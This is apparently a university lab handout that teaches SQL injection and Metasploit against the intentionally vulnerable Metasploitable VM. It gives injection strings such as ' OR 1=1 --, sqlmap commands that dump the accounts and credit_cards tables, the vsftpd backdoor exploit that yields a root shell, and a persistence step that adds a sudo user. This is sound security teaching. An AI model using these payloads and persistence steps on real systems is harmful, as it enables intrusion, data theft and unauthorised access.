# Exploiting Injection Attacks

In this section we will learn about injections vulnerabilities and how to exploit them. We will focus on one type of injection vulnerabilities that is called, SQLi (SQL Injection). Frist, we will try to do manual exploitation, and then use a tool (sqlmap).
The lab setting is similar to the lab setting you had in the last week: Kali connected to Metasploitable. Please make sure that both machines use "Host-only" adapter in VirtualBox.  When you start metaspolitable, you will be given access to the CLI. You can login using the following username/password: msfadmin/msfadmin. You need also to check the IP addresses of both machines using `ifconfig`. Note both IP addresses and try to check the connection between them by using `ping` command. 

Metasplitable runs various vulnerable web applications and databases. The web server starts automatically when the machine is booted. To access these web applications, Open a web browser in Kali machine, e.g., Firefox, and enter the following URL: "http://<MetasploitableIP>". If the connection is successful, a web page will open that lists the vulnerable machines which are:
  
* TWiki
* phpMyAdmin
* mutillidae 
* DVWA
* WebDav

If you click on each link you will be directed to the respective web application. The applications are installed in the `/var/www` folder.

## Configuring the database

Before you start, you also need to do a minor change in the configuration in the metasploitable machine for the mutillidae application:

After you have logged in to metasploitable, open the "config.inc" with the following command:

```bash
sudo nano /var/www/mutillidae/config.inc
```
Once nano opens config.inc file, replace ‘metasploit’ in the line $dbname = ‘metasploit’ with ‘owasp10’. The line should look like:

$dbname = ‘owasp10’;

Now, save and exit (CTRL+X). Then you reset the apache server

```bash
sudo /etc/init.d/apache2 reload

```
## Simple SQL Injection

Now, go back to kali, open a browser and visit the "mutillidae" application as explained above. Click  on "toggle hints" to get hints, and also make sure you work with the security level 0. If not click on "toggle security" to change the level. 

To test that the user accounts table works fine, go to "Login/Register" and then click on "Please register here" button. Enter the username/pasword: tom/tom, and click on "create account". If this is successful, you will get the message 
"Account created for tom. 1 rows inserted."

Now, in the left bar, go to 
"OWASP Top 10 > A1 Injection > SQLi - Extract Data > User Info", you will be directed to login form (username / password). Try to login with the newly created user, and you should get the account information. 


Let us try now simple SQLi. Let start by entering a single quote " ' ", or a name followed by single quote, like "Mike'", in the name field and see what will happen! You can see that the login was not successful and you are presented with an error message that includes some information, what information you get in the error message? Inspect the information related to the "file" and the "Diagnostic Information". What is the SQL statement that was sent to the server?

You can see that the query that is sent to the server looks like this 
` SELECT * FROM accounts WHERE username='<Name input>' AND password='<password input>' `

That request selects all (*) the columns (*username*, *password*)  from the *accounts* table  for any record that has a username that is the same as the username provided AND a password the same as the password provided.


### Data retrieval 

Now, we want to create a malicious input instead of username text. The classical example for this malicious exploit is the following input  ` ' OR 1=1 -- ` or ` ' OR 1=1 # ` (please note the space at the end). Let us try this input. Enter  ` ' OR 1=1 -- ` in the "Name" filed and nothing in the "Password" field. and click on "View Account Details". What is the output of this command?

The output is actually a dump of all records in the *accounts* table.   What happened?

To search for only the admin user, we can put in the Name field ` admin’# `. What will you get?

This simple injection attack allowed the attacker to retrieve sensitive data and bypassing authentication. If you want to learn more advanced statements that you can manually inject to retrieve database names, and other important information, please check the following tutorial (Optional) https://tanvitrivedi.medium.com/sql-injection-in-mutillidae-af0411367949. However this requires some knowledge of SQL. 


## SQL Injection with a tool (SQLmap)
SQLmapp is an SQL injection command line tool. It is included in Kali linux. To get an introduction to the tool, please check the usage information here: https://github.com/sqlmapproject/sqlmap/wiki/Usage

First check the sqlmap version, and show the help by running the command
`sqlmap --version`
`sqlmap --help`

Let us try the page that we targeted manually in the last task, by running the following command, 

`sqlmap -u "http://192.168.56.3/mutillidae/index.php?page=user-info.php" `

The command will prompt you with some question, just accept the options that sqlmap provides. What is the output that you get from the last command?

The comamnd tells us that "all tested paramerters do not appear to be injectable. ...". However, we know, and tested manually, that usename is an injectable parameter. So, we will tell sqlmap about the injectable parameters we know. To do that we want to get the url with the parameters we want to use. Now go back to the browser and go back to the user-info.php page that we tested before. Enter any random values for "Name" and "Password", say aa/bb, and click on  "View Account Details". After that copy the url to use in sqlmap. The url will look like this 
"http://192.168.56.3/mutillidae/index.php?page=user-info.php&username=aa&password=bb&user-info-php-submit-button=View+Account+Details"
(asuming 192.168.56.3 is the IP address of metasploitable)


Now, we can see that sqlmap identified the DB as MySQL and detected that "username" parameter is vulnerable. How many HTTP requests sqlmap sent during the tests?

Now you can try the last command, but adding the following option " --current-db". What do you notice? What is the name of the current database that sqlmap identified? 

You can notice from the output that the name of the table is "owasp10". Now, we want to run the following command to retrieve all tables from the identified database:

`sqlmap -u "http://192.168.56.3/mutillidae/index.php?page=user-info.php&username=aa&password=bb&user-info-php-submit-button=View+Account+Details" -D owasp10 --tables `

How many tables does the "owasp10" database have?

One of the tables is called "accounts", which we identified in the last task, and another one is called "credit_cards", which sounds interesting :-). So, now we want to retrieve all data in those tables, and for that we use the options "-T " for the table name, and "--dump" for dumping the table conent. Run the command: 


`sqlmap -u "http://192.168.56.3/mutillidae/index.php?page=user-info.php&username=aa&password=bb&user-info-php-submit-button=View+Account+Details" -D owasp10 -T accounts --dump `

What is the output of the last command? How many admin accounts can you identify?

Now, try to retrieve all information for the credit_cards table! What is the command that you should run?

How many credit cards are stored in that table?

Finally, if you want to test and dump every table of every database on that server, you can use the option "-all". You can try it later, as it will take a long time. 


# Exploitation with Metasploit


Now, we want to use a general and very powerful tool to exploit various types of vulnerabilities, which is called "Metasploit". From the last week we’ve found some vulnerabilities, and metasploit will help you exploit them. Metasploit comes preloaded with hundreds of exploits for known software vulnerabilities found in a large range of systems.  

A lot of additional material on how to use Metasploit can be found at http://www.offensive-security.com/metasploit-unleashed. Some of the material in this lab are also taken from that site.

+ To ensure that we have the latest version of Metasploit installed, we first need to update it:

```bash
apt-get update                       % update the repository list
apt-get install metasploit-framework % update metasploit
service postgresql start             % metasploit uses a postresql database
msfdb init                           % initialize the database
```

## Running Metasploit

Start Metasploit by running *msfconsole*: `# msfconsole`. You will soon be greeted by an ASCII welcome logo.

You are now in the Metasploit command console. At any point you can type help or ? to get a list of all available commands. The console functions pretty much like normal Linux terminal.

## Searching for exploits

Metasploit comes with a large number of pre-made exploits (or modules) that you can use. 

+ To find a particular exploit, type search followed by a keyword. For example, to search for FTP exploits for Linux type the following command:

`msf > search platform:unix platform:linux type:exploit ftp`

We use both Unix and Linux as platform since most exploits categorized as Unix will work on Linux.

As we saw earlier (during the Nmap scan) our victim runs two FTP servers, so this might be a good start for us.

For more information about the search command, see https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/#search

## Using an exploit - How it works

We will first explain the steps needed to use an exploit. Then we will apply these steps to gain remote access to the victim machine using backdoored FTP server. 

Once you have found an exploit that looks promising you need to tell Metasploit how it should be executed. 

The steps for using an exploit are the following:

1. Tell Metasploit which module you want to try with the *use* command:

```bash
msf > use exploit/platform/service/exploit_name
msf exploit(exploit_name) >
```

2. Use the *show options* command to see the parameters that the module uses: 

```bash
msf exploit(exploit_name) > show options
```

3. With the help of the *set* command, set the *RHOST* parameter to the IP address of the victim, i.e., metasploiable machine: 

```bash
msf exploit(exploit_name) > set RHOST <IP_address_victim_machine>
```

4. type *run* to run the exploit

# Example: Using backdoored FTP server

Having done a vulnerability scan, it’s time to do the actual “hacking”. Your task is now to gain remote access to the Metasploitable machine and make your access persistent.

Backdoors are methods of bypassing the security of a software program or operating system. They are like normal exploits, but they are deliberately part of the software.

Metasploitable has a backdoored version of vsftpd installed and running. If you look back at the vulnerability scan you’ll see that Nessus discovered the backdoor and flagged it as a “Critical” vulnerability.

## Using the backdoor with metasploit

Metasploit has a module that makes it easy to take advantage of this backdoor.

+ Use the following command to search for vsftpd: `msf > search vsftpd`

+ specify the name of the exploit we want to use: `msf > use exploit/unix/ftp/vsftpd_234_backdoor`

+ Set the target IP-address: `msf exploit(vsftpd_234_backdoor) > set RHOST <IP_address_victim_machine>`

+ Run the exploit: `msf exploit(vsftpd_234_backdoor) > run`

You can see from the last line on the screen that the backdoor worked and a shell was open at port 6200 on the victim machine. You are now connected to that shell and can type any commands you want. 

+ Using the command *whoami*, check which user you are running as. You will find out that you are logged in as "root", which means that vsftpd was running with root privileges.

+ Check that you are actually running commands on the remote machine (Metasploitable) and not locally by running the command  `hostname`

+ Try putting the Kali and Metasploitable windows side by side, run the “reboot” command. 

You will notice that when you rebooted Metasploitable, the backdoor shell stopped working. To gain access to the machine we would have to run the exploit again which might be problematic. We need therefore to make our access persistent.

## Making our access persistent

As we saw in the Nmap scan, the victim is already running both SSH and Telnet, so the easiest way to gain persistent access is by adding an extra user to the system.

+ Run the exploit again to get the backdoor shell back, then run the following commands:

```bash
useradd ttm4175 % Add 'ttm175' as a new user
passwd ttm4175 % Set the password for the new user
usermod -aG sudo ttm4175 % Add the user to the 'admin' group, this is equivalent to being root
reboot
```

The second command will ask you to enter a password for the new user.

+ After running the reboot command, wait until Metasploitable has rebooted and then try to login with for example telnet: `telnet <IP_address_victim_machine>`

+ After logging in, test that you still can get root access:

```bash
$ sudo su % Switch to the root user, 'su' means substitute user
# whoami
```

The last command should print "root" if successful.
